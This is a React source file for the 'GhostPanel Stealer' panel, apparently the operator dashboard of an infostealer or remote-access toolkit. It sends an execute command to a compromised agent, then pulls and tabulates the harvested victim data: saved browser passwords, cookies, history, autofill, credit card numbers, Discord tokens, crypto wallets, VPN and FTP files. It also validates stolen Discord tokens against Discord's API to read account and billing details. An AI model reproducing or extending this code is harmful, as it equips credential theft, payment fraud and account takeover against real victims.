import React, { useState, useEffect, useRef } from 'react';
import { Archive, Play, Settings, FileText, Download, Shield, Key, Eye, CreditCard, MessageSquare, Gamepad, HardDrive, CheckCircle, Folder, User, Globe, Cpu, CreditCard as CardIcon, Server, DollarSign, HelpCircle, X, Box, Lock, Network, Terminal, Activity } from 'lucide-react';
import { API_BASE_URL, WS_BASE_URL } from '../../config';

export default function Stealer({ agentId }) {
    const [config, setConfig] = useState({
        passwords: true, cookies: true, history: true, autofills: true,
        discord: true, telegram: true, wallets: true, games: true, sysinfo: true,
        vpns: true, ftp: true
    });
    
    const [files, setFiles] = useState([]);
    const [isRunning, setIsRunning] = useState(false);
    const [showToast, setShowToast] = useState(false);
    const [activeTab, setActiveTab] = useState('passwords'); 
    const [activeInstruction, setActiveInstruction] = useState(null); 
    
    // Data States
    const [passwordsData, setPasswordsData] = useState([]);
    const [cookiesData, setCookiesData] = useState([]);
    const [historyData, setHistoryData] = useState([]);
    const [autofillsData, setAutofillsData] = useState([]);
    const [cardsData, setCardsData] = useState([]);
    const [systemData, setSystemData] = useState({});
    const [discordData, setDiscordData] = useState([]);
    const [walletsData, setWalletsData] = useState([]);
    const [gamesData, setGamesData] = useState([]);
    const [vpnsData, setVpnsData] = useState([]);
    const [ftpData, setFtpData] = useState([]);

    // Filter States
    const [selectedBrowser, setSelectedBrowser] = useState('All');
    const [selectedProfile, setSelectedProfile] = useState('All');

    // Helper Functions (Declared before usage to avoid ReferenceError)
    const fetchLogs = async (path) => {
        try {
            const safeId = agentId.replace(/:/g, '_');
            const res = await fetch(`${API_BASE_URL}/logs/${safeId}/stealer/${path}`);
            return await res.text();
        } catch(e) { return ""; }
    };

    const parseFilename = (path) => {
        const name = path.split('/').pop();
        const parts = name.split('_');
        if (parts.length >= 3) {
            const browser = parts[0];
            const type = parts[parts.length - 1]; 
            const profile = name.replace(`${browser}_`, "").replace(`_${type}`, "");
            return { browser, profile };
        }
        return { browser: parts[0], profile: 'Default' };
    };

    const getBrowserName = (path) => path.split('/').pop().split('_')[0];

    // Data Parsing Functions
    const fetchAndParsePasswords = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = [];
        let current = { browser, profile };
        lines.forEach(line => {
            if (line.startsWith("URL: ")) current.url = line.substring(5).trim();
            if (line.startsWith("USER: ")) current.user = line.substring(6).trim();
            if (line.startsWith("PASS: ")) {
                current.pass = line.substring(6).trim();
                parsed.push(current);
                current = { browser, profile };
            }
        });
        if (parsed.length > 0) setPasswordsData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseCookies = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = [];
        lines.forEach(line => {
            if (line.startsWith("#") || !line.trim()) return;
            const parts = line.split('\t');
            if (parts.length >= 7) {
                parsed.push({
                    browser, profile, domain: parts[0], name: parts[5], value: parts[6], path: parts[2] 
                });
            }
        });
        if (parsed.length > 0) setCookiesData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseHistory = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        // FIX: Using a simpler regex to avoid esbuild issues
        const parsed = lines.filter(l=>l.trim()).map(line => {
            const match = line.match(/^\\\[(.*?)\\\] (.*) \\\\[([^)]+)\\\]$/);
            if(match) return { browser, profile, time: match[1], title: match[2], url: match[3] };
            
            // Fallback parsing
            try {
                const timeEnd = line.indexOf('] ');
                const urlStart = line.lastIndexOf(' (');
                if (timeEnd > -1 && urlStart > -1) {
                    return {
                        browser, profile,
                        time: line.substring(1, timeEnd),
                        title: line.substring(timeEnd + 2, urlStart),
                        url: line.substring(urlStart + 2, line.length - 1)
                    };
                }
            } catch(e) {}
            return null;
        }).filter(x=>x);
        setHistoryData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseAutofills = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = lines.filter(l=>l.trim()).map(line => {
            const parts = line.split(': ');
            if(parts.length >= 2) return { browser, profile, name: parts[0], value: parts[1] };
            return null;
        }).filter(x=>x);
        setAutofillsData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseCards = async (path) => {
        const text = await fetchLogs(path);
        const { browser, profile } = parseFilename(path);
        const lines = text.split('\n');
        const parsed = [];
        let current = { browser, profile };
        lines.forEach(line => {
            if (line.startsWith("Name: ")) current.name = line.substring(6).trim();
            if (line.startsWith("Exp: ")) current.exp = line.substring(5).trim();
            if (line.startsWith("Num: ")) {
                current.num = line.substring(5).trim();
                parsed.push(current);
                current = { browser, profile };
            }
        });
        if (parsed.length > 0) setCardsData(prev => [...prev, ...parsed]);
    };

    const fetchAndParseSystem = async (path) => {
        const text = await fetchLogs(path);
        const lines = text.split('\n');
        const data = {};
        lines.forEach(line => {
            const splitIdx = line.indexOf(':');
            if (splitIdx > -1) {
                const k = line.substring(0, splitIdx).trim();
                const v = line.substring(splitIdx + 1).trim();
                data[k] = v;
            }
        });
        setSystemData(data);
    };

    const fetchAndParseDiscord = async (path) => {
        const text = await fetchLogs(path);
        const lines = text.split('\n');
        const newTokens = [];
        lines.forEach(line => {
            const tokenMatch = line.match(/Token: (.*)/);
            if (tokenMatch) newTokens.push(tokenMatch[1].trim());
        });
        if (newTokens.length > 0) {
            setDiscordData(prev => {
                const updated = [...prev];
                newTokens.forEach(token => {
                    if (!updated.find(d => d.token === token)) {
                        updated.push({ token, info: {}, billing: [], guilds: [], isNitro: false, hasBilling: false });
                    }
                });
                return updated;
            });
        }
    };

    // Effects
    useEffect(() => {
        fetchStatus();
        fetchFiles();
    }, [agentId]); 

    useEffect(() => {
        if (!isRunning) fetchFiles();
    }, [isRunning]);

    const fetchStatus = () => {
        fetch(`${API_BASE_URL}/api/agents/${agentId}/stealer/status`)
            .then(res => res.json())
            .then(data => {
                if (data.status === "finished" && isRunning) finishExecution();
                else if (data.status === "running") setIsRunning(true);
            }).catch(() => {});
    };

    const fetchFiles = () => {
        fetch(`${API_BASE_URL}/api/agents/${agentId}/stealer/files`)
            .then(res => res.json())
            .then(list => {
                if (Array.isArray(list)) {
                    const currentFiles = JSON.stringify(files.sort());
                    const newFiles = JSON.stringify(list.sort());
                    if (currentFiles === newFiles && files.length > 0) return;

                    setFiles(list);
                    setPasswordsData([]);
                    setCookiesData([]);
                    setHistoryData([]);
                    setAutofillsData([]);
                    setCardsData([]);
                    
                    const wallets = [], games = [], vpns = [], ftps = [];
                    list.forEach(file => {
                        if (file.endsWith("_passwords.txt")) fetchAndParsePasswords(file);
                        if (file.endsWith("_cookies.txt")) fetchAndParseCookies(file);
                        if (file.endsWith("_history.txt")) fetchAndParseHistory(file);
                        if (file.endsWith("_autofill.txt")) fetchAndParseAutofills(file);
                        if (file.includes("cards.txt")) fetchAndParseCards(file);
                        if (file.endsWith("SystemInfo.txt")) fetchAndParseSystem(file);
                        if (file.includes("tokens.txt") || file.includes("decrypted_tokens.txt")) fetchAndParseDiscord(file);
                        if (file.startsWith("Wallets/")) wallets.push(file);
                        if (file.startsWith("Games/")) games.push(file);
                        if (file.startsWith("VPN/")) vpns.push(file);
                        if (file.startsWith("FTP/")) ftps.push(file);
                    });
                    setWalletsData(wallets);
                    setGamesData(games);
                    setVpnsData(vpns);
                    setFtpData(ftps);
                }
            }).catch(() => {});
    };

    const finishExecution = () => {
        setIsRunning(false);
        localStorage.removeItem(`stealer_running_${agentId}`);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 5000);
    };

    const handleRun = () => {
        setIsRunning(true);
        localStorage.setItem(`stealer_running_${agentId}`, 'true');
        setFiles([]); setPasswordsData([]); setCardsData([]); setDiscordData([]); setSystemData({}); 
        setCookiesData([]); setHistoryData([]); setAutofillsData([]); setWalletsData([]); setGamesData([]);
        setVpnsData([]); setFtpData([]);
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.onopen = () => {
            ws.send(`__STEALER_EXEC__:${JSON.stringify(config)}`);
            ws.close();
        };
    };

    const checkDiscordToken = async (token, index) => {
        try {
            const res = await fetch("https://discord.com/api/v9/users/@me", {
                headers: { "Authorization": token }
            });
            if (res.ok) {
                const info = await res.json();
                setDiscordData(prev => {
                    const newData = [...prev];
                    newData[index] = { ...newData[index], info, isNitro: info.premium_type > 0 };
                    return newData;
                });
                const billRes = await fetch("https://discord.com/api/v9/users/@me/billing/payment-sources", {
                    headers: { "Authorization": token }
                });
                if (billRes.ok) {
                    const billing = await billRes.json();
                    setDiscordData(prev => {
                        const newData = [...prev];
                        newData[index] = { ...newData[index], billing, hasBilling: billing.length > 0 };
                        return newData;
                    });
                }
            } else {
                alert("Invalid or Expired Token");
            }
        } catch (e) {
            console.error(e);
            alert("Failed to check token (CORS/Network Error). Try via Server.");
        }
    };

    const getAvailableBrowsers = () => {
        const all = [...passwordsData, ...cookiesData, ...historyData, ...autofillsData, ...cardsData];
        return Array.from(new Set(all.map(d => d.browser))).sort();
    };

    const getAvailableProfiles = () => {
        if (selectedBrowser === 'All') return [];
        const all = [...passwordsData, ...cookiesData, ...historyData, ...autofillsData, ...cardsData];
        return Array.from(new Set(all.filter(d => d.browser === selectedBrowser).map(d => d.profile))).sort();
    };

    const filtered = (data) => {
        return data.filter(d => {
            if (selectedBrowser !== 'All' && d.browser !== selectedBrowser) return false;
            if (selectedProfile !== 'All' && d.profile !== selectedProfile) return false;
            return true;
        });
    };

    const Toggle = ({ label, keyName, icon: Icon, color }) => (
        <div className={`p-3 rounded-md border cursor-pointer flex items-center justify-between select-none ${config[keyName] ? `bg-${color}-900/20 border-${color}-500/50` : 'bg-[#151515] border-[#333]'}`}
             onClick={() => !isRunning && setConfig(prev => ({ ...prev, [keyName]: !prev[keyName] }))}>
            <div className="flex items-center gap-2">
                <div className={`p-1.5 rounded-full ${config[keyName] ? `text-${color}-400` : 'text-gray-600'}`}><Icon size={16} /></div>
                <span className={`font-bold text-xs ${config[keyName] ? 'text-white' : 'text-gray-500'}`}>{label}</span>
            </div>
            <div className={`w-8 h-4 rounded-full relative transition-all duration-300 ${config[keyName] ? `bg-${color}-500` : 'bg-gray-700'}`}>
                <div className={`absolute top-0.5 w-3 h-3 bg-white rounded-full transition-all duration-300 shadow-sm ${config[keyName] ? 'left-[18px]' : 'left-0.5'}`} />
            </div>
        </div>
    );

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] text-gray-300 p-6 overflow-y-auto relative scrollbar-thin">
            {activeInstruction && (
                <div className="fixed inset-0 bg-black/80 z-[200] flex items-center justify-center p-4 backdrop-blur-sm" onClick={()=>setActiveInstruction(null)}>
                    <div className="bg-[#1a1a1a] border border-red-500/50 rounded-xl p-6 max-w-md w-full shadow-2xl relative" onClick={e=>e.stopPropagation()}>
                        <button onClick={()=>setActiveInstruction(null)} className="absolute top-4 right-4 text-gray-500 hover:text-white"><X size={20}/></button>
                        <h3 className="text-xl font-bold text-white mb-4 flex items-center gap-2"><Gamepad className="text-red-500"/> {activeInstruction.title}</h3>
                        <ol className="list-decimal list-inside space-y-3 text-sm text-gray-300">
                            {activeInstruction.steps.map((step, i) => <li key={i}><span className="text-gray-400">{step}</span></li>)}
                        </ol>
                    </div>
                </div>
            )}

            {showToast && (
                <div className="fixed top-6 right-6 bg-[#1a1a1a] border border-green-500 text-white px-6 py-4 rounded-lg shadow-[0_0_30px_rgba(34,197,94,0.3)] flex items-center gap-4 animate-slide-up z-[100]">
                    <CheckCircle className="text-green-500" size={28} />
                    <div><div className="font-bold text-lg">Harvest Complete!</div></div>
                </div>
            )}

            <div className="flex justify-between mb-6 pb-4 border-b border-[#333]">
                <div className="flex items-center gap-3">
                    <Shield size={32} className="text-red-600" />
                    <div>
                        <h2 className="text-2xl font-bold text-white">GhostPanel Stealer</h2>
                        <div className="text-[10px] font-mono text-gray-500 uppercase flex items-center gap-2">
                            <div className={`w-2 h-2 rounded-full ${isRunning ? 'bg-yellow-500 animate-pulse' : 'bg-green-500'}`}></div>
                            {isRunning ? 'AGENT EXECUTING...' : 'READY'}
                        </div>
                    </div>
                </div>
                <div className="flex gap-3">
                    <button onClick={fetchFiles} className="px-4 py-2 rounded font-bold bg-[#222] hover:bg-[#333] border border-[#444] text-white flex gap-2"><Activity size={18}/> REFRESH</button>
                    <button onClick={() => window.location.href = `${API_BASE_URL}/api/agents/${agentId}/stealer/zip`} className="px-5 py-2 rounded font-bold bg-[#222] hover:bg-[#333] border border-[#444] text-white flex gap-2"><Download size={18}/> ZIP</button>
                    <button onClick={handleRun} disabled={isRunning} className={`px-8 py-2 rounded font-extrabold flex gap-2 ${isRunning ? 'bg-gray-800 text-gray-500' : 'bg-red-600 hover:bg-red-500 text-white'}`}>
                        {isRunning ? <Settings className="animate-spin" size={20}/> : <Play size={20}/>} {isRunning ? 'RUNNING...' : 'EXECUTE'}
                    </button>
                </div>
            </div>

            <div className={`grid grid-cols-6 gap-3 mb-6 ${isRunning ? 'opacity-50 pointer-events-none' : ''}`}>
                <Toggle label="Passwords" keyName="passwords" icon={Key} color="red" />
                <Toggle label="Cookies" keyName="cookies" icon={Eye} color="orange" />
                <Toggle label="Discord" keyName="discord" icon={MessageSquare} color="violet" />
                <Toggle label="Cards" keyName="autofills" icon={CreditCard} color="rose" />
                <Toggle label="Wallets" keyName="wallets" icon={Archive} color="green" />
                <Toggle label="System" keyName="sysinfo" icon={HardDrive} color="blue" />
            </div>

            <div className="flex justify-between items-end">
                <div className="flex gap-1 bg-[#111] p-1 w-fit rounded-t-lg border-x border-t border-[#333]">
                    {['passwords', 'cookies', 'history', 'autofills', 'cards', 'discord', 'wallets', 'system'].map(tab => (
                        <button key={tab} onClick={()=>setActiveTab(tab)} className={`px-4 py-2 text-[10px] font-black uppercase transition ${activeTab===tab ? 'bg-red-600 text-white rounded' : 'text-gray-500 hover:text-gray-300'}`}>
                            {tab}
                        </button>
                    ))}
                </div>
            </div>

            <div className="bg-[#161616] border border-[#333] rounded-b-lg rounded-tr-none rounded-tl-none flex-1 min-h-[500px] flex flex-col p-0 overflow-hidden shadow-inner">
                {activeTab === 'passwords' && (
                    <div className="overflow-y-auto h-full scrollbar-thin">
                        <table className="w-full text-left">
                            <thead className="bg-[#0f0f0f] sticky top-0 z-10 text-[10px] text-gray-500 font-black uppercase">
                                <tr><th className="p-4">Browser / Profile</th><th className="p-4">URL</th><th className="p-4">Username</th><th className="p-4 text-right">Password</th></tr>
                            </thead>
                            <tbody>
                                {filtered(passwordsData).map((p, i) => (
                                    <tr key={i} className="border-b border-[#222] hover:bg-[#1a1a1a] text-xs font-mono transition-colors">
                                        <td className="p-4 text-gray-500">
                                            <div className="font-bold text-white">{p.browser}</div>
                                            <div className="text-[10px]">{p.profile}</div>
                                        </td>
                                        <td className="p-4 text-blue-400 truncate max-w-[200px]" title={p.url}>{p.url}</td>
                                        <td className="p-4 text-gray-300">{p.user}</td>
                                        <td className="p-4 text-right text-red-400 select-all font-bold">{p.pass}</td>
                                    </tr>
                                ))}
                            </tbody>
                        </table>
                    </div>
                )}
                {/* Fallback for empty tabs */}
                {activeTab === 'passwords' && passwordsData.length === 0 && <div className="flex-1 flex items-center justify-center text-gray-600 font-mono italic text-xs">No passwords harvested yet.</div>}
            </div>
        </div>
    );
}